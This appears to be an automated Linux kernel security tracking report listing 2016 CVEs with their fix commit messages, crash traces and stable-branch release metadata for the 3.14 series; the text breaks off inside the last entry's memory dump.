The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4482
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-03
Linus Commit: 681fef8380eb818c0b845fca5d2ab1dcbab114ee
Linus Tag: 4.7
Stable Date: 2016-08-20
Stable Commit: fd13a6831e1c770e20619efb48be360c24574717
Stable Tag: 3.14.77

CVE-2016-4485:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.70.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b8670c09f37bdf2847cc44f36511a53afc6161fd
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Tue May 3 16:35:05 2016 -0400

    net: fix infoleak in llc
    
    The stack object info has a total size of 12 bytes. Its last byte
    is padding which is not initialized and leaked via put_cmsg.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/llc/af_llc.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4485
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-04
Linus Commit: b8670c09f37bdf2847cc44f36511a53afc6161fd
Linus Tag: 4.6
Stable Date: 2016-05-18
Stable Commit: f3a0b05e04b862ffc549b5635339a5cee00da34d
Stable Tag: 3.14.70

CVE-2016-4486:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.70.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 5f8e44741f9f216e33736ea4ec65ca9ac03036e6
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Tue May 3 16:46:24 2016 -0400

    net: fix infoleak in rtnetlink
    
    The stack object map has a total size of 32 bytes. Its last 4
    bytes are padding generated by compiler. These padding bytes are
    not initialized and sent out via nla_put.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/core/rtnetlink.c |   18 ++++++++++--------
 1 file changed, 10 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4486
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-04
Linus Commit: 5f8e44741f9f216e33736ea4ec65ca9ac03036e6
Linus Tag: 4.6
Stable Date: 2016-05-18
Stable Commit: c1e797692b97ec480bc0e940cc022823e3cc40c9
Stable Tag: 3.14.70

CVE-2016-4557:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
Author: Jann Horn <jannh@google.com>
Date:   Tue Apr 26 22:26:26 2016 +0200

    bpf: fix double-fdput in replace_map_fd_with_map_ptr()
    
    When bpf(BPF_PROG_LOAD, ...) was invoked with a BPF program whose bytecode
    references a non-map file descriptor as a map file descriptor, the error
    handling code called fdput() twice instead of once (in __bpf_map_get() and
    in replace_map_fd_with_map_ptr()). If the file descriptor table of the
    current task is shared, this causes f_count to be decremented too much,
    allowing the struct file to be freed while it is still in use
    (use-after-free). This can be exploited to gain root privileges by an
    unprivileged user.
    
    This bug was introduced in
    commit 0246e64d9a5f ("bpf: handle pseudo BPF_LD_IMM64 insn"), but is only
    exploitable since
    commit 1be7f75d1668 ("bpf: enable non-root eBPF programs") because
    previously, CAP_SYS_ADMIN was required to reach the vulnerable code.
    
    (posted publicly according to request by maintainer)
    
    Signed-off-by: Jann Horn <jannh@google.com>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Acked-by: Alexei Starovoitov <ast@kernel.org>
    Acked-by: Daniel Borkmann <daniel@iogearbox.net>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 kernel/bpf/verifier.c |    1 -
 1 file changed, 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4557
Break Date: 2015-10-12
Break Commit: 1be7f75d1668d6296b80bf35dcf6762393530afc
Break Tag: 4.4
Linus Fix Date: 2016-04-26
Linus Commit: 8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-4558:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 92117d8443bc5afacc8d5ba82e541946310f106e
Author: Alexei Starovoitov <ast@fb.com>
Date:   Wed Apr 27 18:56:20 2016 -0700

    bpf: fix refcnt overflow
    
    On a system with >32Gbyte of phyiscal memory and infinite RLIMIT_MEMLOCK,
    the malicious application may overflow 32-bit bpf program refcnt.
    It's also possible to overflow map refcnt on 1Tb system.
    Impose 32k hard limit which means that the same bpf program or
    map cannot be shared by more than 32k processes.
    
    Fixes: 1be7f75d1668 ("bpf: enable non-root eBPF programs")
    Reported-by: Jann Horn <jannh@google.com>
    Signed-off-by: Alexei Starovoitov <ast@kernel.org>
    Acked-by: Daniel Borkmann <daniel@iogearbox.net>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/bpf.h   |    3 ++-
 kernel/bpf/inode.c    |    7 ++++---
 kernel/bpf/syscall.c  |   24 ++++++++++++++++++++----
 kernel/bpf/verifier.c |   11 +++++++----
 4 files changed, 33 insertions(+), 12 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4558
Break Date: 2015-10-12
Break Commit: 1be7f75d1668d6296b80bf35dcf6762393530afc
Break Tag: 4.4
Linus Fix Date: 2016-04-28
Linus Commit: 92117d8443bc5afacc8d5ba82e541946310f106e
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-4565:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3
Author: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>
Date:   Sun Apr 10 19:13:13 2016 -0600

    IB/security: Restrict use of the write() interface
    
    The drivers/infiniband stack uses write() as a replacement for
    bi-directional ioctl().  This is not safe. There are ways to
    trigger write calls that result in the return structure that
    is normally written to user space being shunted off to user
    specified kernel memory instead.
    
    For the immediate repair, detect and deny suspicious accesses to
    the write API.
    
    For long term, update the user space libraries and the kernel API
    to something that doesn't present the same security vulnerabilities
    (likely a structured ioctl() interface).
    
    The impacted uAPI interfaces are generally only available if
    hardware from drivers/infiniband is installed in the system.
    
    Reported-by: Jann Horn <jann@thejh.net>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Signed-off-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>
    [ Expanded check to all known write() entry points ]
    Cc: stable@vger.kernel.org
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/core/ucm.c            |    4 ++++
 drivers/infiniband/core/ucma.c           |    3 +++
 drivers/infiniband/core/uverbs_main.c    |    5 +++++
 drivers/infiniband/hw/qib/qib_file_ops.c |    5 +++++
 drivers/staging/rdma/hfi1/TODO           |    2 +-
 drivers/staging/rdma/hfi1/file_ops.c     |    6 ++++++
 include/rdma/ib.h                        |   16 ++++++++++++++++
 7 files changed, 40 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4565
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-04-28
Linus Commit: e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3
Linus Tag: 4.6
Stable Date: 2016-08-16
Stable Commit: c96c87e19293995d5adde47bb20ae827e8b73607
Stable Tag: 3.14.76

CVE-2016-4569:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.75.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit cec8f96e49d9be372fdb0c3836dcf31ec71e457e
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Tue May 3 16:44:07 2016 -0400

    ALSA: timer: Fix leak in SNDRV_TIMER_IOCTL_PARAMS
    
    The stack object tread has a total size of 32 bytes. Its field
    event and val both contain 4 bytes padding. These 8 bytes
    padding bytes are sent to user without being initialized.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/timer.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4569
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-08
Linus Commit: cec8f96e49d9be372fdb0c3836dcf31ec71e457e
Linus Tag: 4.7
Stable Date: 2016-08-10
Stable Commit: a4eabc8c16004cc41f6a71c31cf7e349fa6efe50
Stable Tag: 3.14.75

CVE-2016-4578:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.75.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 9a47e9cff994f37f7f0dbd9ae23740d0f64f9fe6
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Tue May 3 16:44:20 2016 -0400

    ALSA: timer: Fix leak in events via snd_timer_user_ccallback
    
    The stack object r1 has a total size of 32 bytes. Its field
    event and val both contain 4 bytes padding. These 8 bytes
    padding bytes are sent to user without being initialized.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/timer.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4578
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-08
Linus Commit: 9a47e9cff994f37f7f0dbd9ae23740d0f64f9fe6
Linus Tag: 4.7
Stable Date: 2016-08-10
Stable Commit: 414d03573fe4e942f07b1c3c8750227c6be0b061
Stable Tag: 3.14.75

CVE-2016-4578:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.75.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit e4ec8cc8039a7063e24204299b462bd1383184a5
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Tue May 3 16:44:32 2016 -0400

    ALSA: timer: Fix leak in events via snd_timer_user_tinterrupt
    
    The stack object r1 has a total size of 32 bytes. Its field
    event and val both contain 4 bytes padding. These 8 bytes
    padding bytes are sent to user without being initialized.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/timer.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4578
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-08
Linus Commit: e4ec8cc8039a7063e24204299b462bd1383184a5
Linus Tag: 4.7
Stable Date: 2016-08-10
Stable Commit: b40763254a772aaa1353237694eff230db004d7b
Stable Tag: 3.14.75

CVE-2016-4580:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.70.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 79e48650320e6fba48369fccf13fd045315b19b8
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Sun May 8 12:10:14 2016 -0400

    net: fix a kernel infoleak in x25 module
    
    Stack object "dte_facilities" is allocated in x25_rx_call_request(),
    which is supposed to be initialized in x25_negotiate_facilities.
    However, 5 fields (8 bytes in total) are not initialized. This
    object is then copied to userland via copy_to_user, thus infoleak
    occurs.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/x25/x25_facilities.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4580
Break Date: 2005-04-16
Break Commit: 1da177e4c3f41524e886b7f1b8a0c1fc7321cac2
Break Tag: 2.6
Linus Fix Date: 2016-05-09
Linus Commit: 79e48650320e6fba48369fccf13fd045315b19b8
Linus Tag: 4.6
Stable Date: 2016-05-18
Stable Commit: a1f85b3a66d74389417e86505013e51a06b789f0
Stable Tag: 3.14.70

CVE-2016-4581:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 5ec0811d30378ae104f250bfc9b3640242d81e3f
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Thu May 5 09:29:29 2016 -0500

    propogate_mnt: Handle the first propogated copy being a slave
    
    When the first propgated copy was a slave the following oops would result:
    > BUG: unable to handle kernel NULL pointer dereference at 0000000000000010
    > IP: [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0
    > PGD bacd4067 PUD bac66067 PMD 0
    > Oops: 0000 [#1] SMP
    > Modules linked in:
    > CPU: 1 PID: 824 Comm: mount Not tainted 4.6.0-rc5userns+ #1523
    > Hardware name: Bochs Bochs, BIOS Bochs 01/01/2007
    > task: ffff8800bb0a8000 ti: ffff8800bac3c000 task.ti: ffff8800bac3c000
    > RIP: 0010:[<ffffffff811fba4e>]  [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0
    > RSP: 0018:ffff8800bac3fd38  EFLAGS: 00010283
    > RAX: 0000000000000000 RBX: ffff8800bb77ec00 RCX: 0000000000000010
    > RDX: 0000000000000000 RSI: ffff8800bb58c000 RDI: ffff8800bb58c480
    > RBP: ffff8800bac3fd48 R08: 0000000000000001 R09: 0000000000000000
    > R10: 0000000000001ca1 R11: 0000000000001c9d R12: 0000000000000000
    > R13: ffff8800ba713800 R14: ffff8800bac3fda0 R15: ffff8800bb77ec00
    > FS:  00007f3c0cd9b7e0(0000) GS:ffff8800bfb00000(0000) knlGS:0000000000000000
    > CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
    > CR2: 0000000000000010 CR3: 00000000bb79d000 CR4: 00000000000006e0
    > Stack:
    >  ffff8800bb77ec00 0000000000000000 ffff8800bac3fd88 ffffffff811fbf85
    >  ffff8800bac3fd98 ffff8800bb77f080 ffff8800ba713800 ffff8800bb262b40
    >  0000000000000000 0000000000000000 ffff8800bac3fdd8 ffffffff811f1da0
    > Call Trace:
    >  [<ffffffff811fbf85>] propagate_mnt+0x105/0x140
    >  [<ffffffff811f1da0>] attach_recursive_mnt+0x120/0x1e0
    >  [<ffffffff811f1ec3>] graft_tree+0x63/0x70
    >  [<ffffffff811f1f6b>] do_add_mount+0x9b/0x100
    >  [<ffffffff811f2c1a>] do_mount+0x2aa/0xdf0
    >  [<ffffffff8117efbe>] ? strndup_user+0x4e/0x70
    >  [<ffffffff811f3a45>] SyS_mount+0x75/0xc0
    >  [<ffffffff8100242b>] do_syscall_64+0x4b/0xa0
    >  [<ffffffff81988f3c>] entry_SYSCALL64_slow_path+0x25/0x25
    > Code: 00 00 75 ec 48 89 0d 02 22 22 01 8b 89 10 01 00 00 48 89 05 fd 21 22 01 39 8e 10 01 00 00 0f 84 e0 00 00 00 48 8b 80 d8 00 00 00 <48> 8b 50 10 48 89 05 df 21 22 01 48 89 15 d0 21 22 01 8b 53 30
    > RIP  [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0
    >  RSP <ffff8800bac3fd38>
    > CR2: 0000000000000010
    > ---[ end trace 2725ecd95164f217 ]---
    
    This oops happens with the namespace_sem held and can be triggered by
    non-root users.  An all around not pleasant experience.
    
    To avoid this scenario when finding the appropriate source mount to
    copy stop the walk up the mnt_master chain when the first source mount
    is encountered.
    
    Further rewrite the walk up the last_source mnt_master chain so that
    it is clear what is going on.
    
    The reason why the first source mount is special is that it it's
    mnt_parent is not a mount in the dest_mnt propagation tree, and as
    such termination conditions based up on the dest_mnt mount propgation
    tree do not make sense.
    
    To avoid other kinds of confusion last_dest is not changed when
    computing last_source.  last_dest is only used once in propagate_one
    and that is above the point of the code being modified, so changing
    the global variable is meaningless and confusing.
    
    Cc: stable@vger.kernel.org
    fixes: f2ebb3a921c1ca1e2ddd9242e95a1989a50c4c68 ("smarter propagate_mnt()")
    Reported-by: Tycho Andersen <tycho.andersen@canonical.com>
    Reviewed-by: Seth Forshee <seth.forshee@canonical.com>
    Tested-by: Seth Forshee <seth.forshee@canonical.com>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/pnode.c |   25 ++++++++++++++-----------
 1 file changed, 14 insertions(+), 11 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4581
Break Date: 2014-04-01
Break Commit: f2ebb3a921c1ca1e2ddd9242e95a1989a50c4c68
Break Tag: 3.15
Linus Fix Date: 2016-05-05
Linus Commit: 5ec0811d30378ae104f250bfc9b3640242d81e3f
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-4794:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 6710e594f71ccaad8101bc64321152af7cd9ea28
Author: Tejun Heo <tj@kernel.org>
Date:   Wed May 25 11:48:25 2016 -0400

    percpu: fix synchronization between synchronous map extension and chunk destruction
    
    For non-atomic allocations, pcpu_alloc() can try to extend the area
    map synchronously after dropping pcpu_lock; however, the extension
    wasn't synchronized against chunk destruction and the chunk might get
    freed while extension is in progress.
    
    This patch fixes the bug by putting most of non-atomic allocations
    under pcpu_alloc_mutex to synchronize against pcpu_balance_work which
    is responsible for async chunk management including destruction.
    
    Signed-off-by: Tejun Heo <tj@kernel.org>
    Reported-and-tested-by: Alexei Starovoitov <alexei.starovoitov@gmail.com>
    Reported-by: Vlastimil Babka <vbabka@suse.cz>
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Cc: stable@vger.kernel.org # v3.18+
    Fixes: 1a4d76076cda ("percpu: implement asynchronous chunk population")

 mm/percpu.c |   16 ++++++++--------
 1 file changed, 8 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4794
Break Date: 2014-09-02
Break Commit: 1a4d76076cda69b0abf15463a8cebc172406da25
Break Tag: 3.18
Linus Fix Date: 2016-05-25
Linus Commit: 6710e594f71ccaad8101bc64321152af7cd9ea28
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-4794:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 4f996e234dad488e5d9ba0858bc1bae12eff82c3
Author: Tejun Heo <tj@kernel.org>
Date:   Wed May 25 11:48:25 2016 -0400

    percpu: fix synchronization between chunk->map_extend_work and chunk destruction
    
    Atomic allocations can trigger async map extensions which is serviced
    by chunk->map_extend_work.  pcpu_balance_work which is responsible for
    destroying idle chunks wasn't synchronizing properly against
    chunk->map_extend_work and may end up freeing the chunk while the work
    item is still in flight.
    
    This patch fixes the bug by rolling async map extension operations
    into pcpu_balance_work.
    
    Signed-off-by: Tejun Heo <tj@kernel.org>
    Reported-and-tested-by: Alexei Starovoitov <alexei.starovoitov@gmail.com>
    Reported-by: Vlastimil Babka <vbabka@suse.cz>
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Cc: stable@vger.kernel.org # v3.18+
    Fixes: 9c824b6a172c ("percpu: make sure chunk->map array has available space")

 mm/percpu.c |   57 ++++++++++++++++++++++++++++++++++++---------------------
 1 file changed, 36 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4794
Break Date: 2014-09-02
Break Commit: 9c824b6a172c8d44a6b037946bae90127c969b1b
Break Tag: 3.18
Linus Fix Date: 2016-05-25
Linus Commit: 4f996e234dad488e5d9ba0858bc1bae12eff82c3
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-4805:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 1f461dcdd296eecedaffffc6bae2bfa90bd7eb89
Author: Guillaume Nault <g.nault@alphalink.fr>
Date:   Wed Mar 23 16:38:55 2016 +0100

    ppp: take reference on channels netns
    
    Let channels hold a reference on their network namespace.
    Some channel types, like ppp_async and ppp_synctty, can have their
    userspace controller running in a different namespace. Therefore they
    can't rely on them to preclude their netns from being removed from
    under them.
    
    ==================================================================
    BUG: KASAN: use-after-free in ppp_unregister_channel+0x372/0x3a0 at
    addr ffff880064e217e0
    Read of size 8 by task syz-executor/11581
    =============================================================================
    BUG net_namespace (Not tainted): kasan: bad access detected
    -----------------------------------------------------------------------------
    
    Disabling lock debugging due to kernel taint
    INFO: Allocated in copy_net_ns+0x6b/0x1a0 age=92569 cpu=3 pid=6906
    [<      none      >] ___slab_alloc+0x4c7/0x500 kernel/mm/slub.c:2440
    [<      none      >] __slab_alloc+0x4c/0x90 kernel/mm/slub.c:2469
    [<     inline     >] slab_alloc_node kernel/mm/slub.c:2532
    [<     inline     >] slab_alloc kernel/mm/slub.c:2574
    [<      none      >] kmem_cache_alloc+0x23a/0x2b0 kernel/mm/slub.c:2579
    [<     inline     >] kmem_cache_zalloc kernel/include/linux/slab.h:597
    [<     inline     >] net_alloc kernel/net/core/net_namespace.c:325
    [<      none      >] copy_net_ns+0x6b/0x1a0 kernel/net/core/net_namespace.c:360
    [<      none      >] create_new_namespaces+0x2f6/0x610 kernel/kernel/nsproxy.c:95
    [<      none      >] copy_namespaces+0x297/0x320 kernel/kernel/nsproxy.c:150
    [<      none      >] copy_process.part.35+0x1bf4/0x5760 kernel/kernel/fork.c:1451
    [<     inline     >] copy_process kernel/kernel/fork.c:1274
    [<      none      >] _do_fork+0x1bc/0xcb0 kernel/kernel/fork.c:1723
    [<     inline     >] SYSC_clone kernel/kernel/fork.c:1832
    [<      none      >] SyS_clone+0x37/0x50 kernel/kernel/fork.c:1826
    [<      none      >] entry_SYSCALL_64_fastpath+0x16/0x7a kernel/arch/x86/entry/entry_64.S:185
    
    INFO: Freed in net_drop_ns+0x67/0x80 age=575 cpu=2 pid=2631
    [<      none      >] __slab_free+0x1fc/0x320 kernel/mm/slub.c:2650
    [<     inline     >] slab_free kernel/mm/slub.c:2805
    [<      none      >] kmem_cache_free+0x2a0/0x330 kernel/mm/slub.c:2814
    [<     inline     >] net_free kernel/net/core/net_namespace.c:341
    [<      none      >] net_drop_ns+0x67/0x80 kernel/net/core/net_namespace.c:348
    [<      none      >] cleanup_net+0x4e5/0x600 kernel/net/core/net_namespace.c:448
    [<      none      >] process_one_work+0x794/0x1440 kernel/kernel/workqueue.c:2036
    [<      none      >] worker_thread+0xdb/0xfc0 kernel/kernel/workqueue.c:2170
    [<      none      >] kthread+0x23f/0x2d0 kernel/drivers/block/aoe/aoecmd.c:1303
    [<      none      >] ret_from_fork+0x3f/0x70 kernel/arch/x86/entry/entry_64.S:468
    INFO: Slab 0xffffea0001938800 objects=3 used=0 fp=0xffff880064e20000
    flags=0x5fffc0000004080
    INFO: Object 0xffff880064e20000 @offset=0 fp=0xffff880064e24200
    
    CPU: 1 PID: 11581 Comm: syz-executor Tainted: G    B           4.4.0+
    Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
    rel-1.8.2-0-g33fbe13 by qemu-project.org 04/01/2014
     00000000ffffffff ffff8800662c7790 ffffffff8292049d ffff88003e36a300
     ffff880064e20000 ffff880064e20000 ffff8800662c77c0 ffffffff816f2054
     ffff88003e36a300 ffffea0001938800 ffff880064e20000 0000000000000000
    Call Trace:
     [<     inline     >] __dump_stack kernel/lib/dump_stack.c:15
     [<ffffffff8292049d>] dump_stack+0x6f/0xa2 kernel/lib/dump_stack.c:50
     [<ffffffff816f2054>] print_trailer+0xf4/0x150 kernel/mm/slub.c:654
     [<ffffffff816f875f>] object_err+0x2f/0x40 kernel/mm/slub.c:661
     [<     inline     >] print_address_description kernel/mm/kasan/report.c:138
     [<ffffffff816fb0c5>] kasan_report_error+0x215/0x530 kernel/mm/kasan/report.c:236
     [<     inline     >] kasan_report kernel/mm/kasan/report.c:259
     [<ffffffff816fb4de>] __asan_report_load8_noabort+0x3e/0x40 kernel/mm/kasan/report.c:280
     [<     inline     >] ? ppp_pernet kernel/include/linux/compiler.h:218
     [<ffffffff83ad71b2>] ? ppp_unregister_channel+0x372/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392
     [<     inline     >] ppp_pernet kernel/include/linux/compiler.h:218
     [<ffffffff83ad71b2>] ppp_unregister_channel+0x372/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392
     [<     inline     >] ? ppp_pernet kernel/drivers/net/ppp/ppp_generic.c:293
     [<ffffffff83ad6f26>] ? ppp_unregister_channel+0xe6/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392
     [<ffffffff83ae18f3>] ppp_asynctty_close+0xa3/0x130 kernel/drivers/net/ppp/ppp_async.c:241
     [<ffffffff83ae1850>] ? async_lcp_peek+0x5b0/0x5b0 kernel/drivers/net/ppp/ppp_async.c:1000
     [<ffffffff82c33239>] tty_ldisc_close.isra.1+0x99/0xe0 kernel/drivers/tty/tty_ldisc.c:478
     [<ffffffff82c332c0>] tty_ldisc_kill+0x40/0x170 kernel/drivers/tty/tty_ldisc.c:744
     [<ffffffff82c34943>] tty_ldisc_release+0x1b3/0x260 kernel/drivers/tty/tty_ldisc.c:772
     [<ffffffff82c1ef21>] tty_release+0xac1/0x13e0 kernel/drivers/tty/tty_io.c:1901
     [<ffffffff82c1e460>] ? release_tty+0x320/0x320 kernel/drivers/tty/tty_io.c:1688
     [<ffffffff8174de36>] __fput+0x236/0x780 kernel/fs/file_table.c:208
     [<ffffffff8174e405>] ____fput+0x15/0x20 kernel/fs/file_table.c:244
     [<ffffffff813595ab>] task_work_run+0x16b/0x200 kernel/kernel/task_work.c:115
     [<     inline     >] exit_task_work kernel/include/linux/task_work.h:21
     [<ffffffff81307105>] do_exit+0x8b5/0x2c60 kernel/kernel/exit.c:750
     [<ffffffff813fdd20>] ? debug_check_no_locks_freed+0x290/0x290 kernel/kernel/locking/lockdep.c:4123
     [<ffffffff81306850>] ? mm_update_next_owner+0x6f0/0x6f0 kernel/kernel/exit.c:357
     [<ffffffff813215e6>] ? __dequeue_signal+0x136/0x470 kernel/kernel/signal.c:550
     [<ffffffff8132067b>] ? recalc_sigpending_tsk+0x13b/0x180 kernel/kernel/signal.c:145
     [<ffffffff81309628>] do_group_exit+0x108/0x330 kernel/kernel/exit.c:880
     [<ffffffff8132b9d4>] get_signal+0x5e4/0x14f0 kernel/kernel/signal.c:2307
     [<     inline     >] ? kretprobe_table_lock kernel/kernel/kprobes.c:1113
     [<ffffffff8151d355>] ? kprobe_flush_task+0xb5/0x450 kernel/kernel/kprobes.c:1158
     [<ffffffff8115f7d3>] do_signal+0x83/0x1c90 kernel/arch/x86/kernel/signal.c:712
     [<ffffffff8151d2a0>] ? recycle_rp_inst+0x310/0x310 kernel/include/linux/list.h:655
     [<ffffffff8115f750>] ? setup_sigcontext+0x780/0x780 kernel/arch/x86/kernel/signal.c:165
     [<ffffffff81380864>] ? finish_task_switch+0x424/0x5f0 kernel/kernel/sched/core.c:2692
     [<     inline     >] ? finish_lock_switch kernel/kernel/sched/sched.h:1099
     [<ffffffff81380560>] ? finish_task_switch+0x120/0x5f0 kernel/kernel/sched/core.c:2678
     [<     inline     >] ? context_switch kernel/kernel/sched/core.c:2807
     [<ffffffff85d794e9>] ? __schedule+0x919/0x1bd0 kernel/kernel/sched/core.c:3283
     [<ffffffff81003901>] exit_to_usermode_loop+0xf1/0x1a0 kernel/arch/x86/entry/common.c:247
     [<     inline     >] prepare_exit_to_usermode kernel/arch/x86/entry/common.c:282
     [<ffffffff810062ef>] syscall_return_slowpath+0x19f/0x210 kernel/arch/x86/entry/common.c:344
     [<ffffffff85d88022>] int_ret_from_sys_call+0x25/0x9f kernel/arch/x86/entry/entry_64.S:281
    Memory state around the buggy address:
     ffff880064e21680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
     ffff880064e21700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
    >ffff880064e21780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
                                                           ^
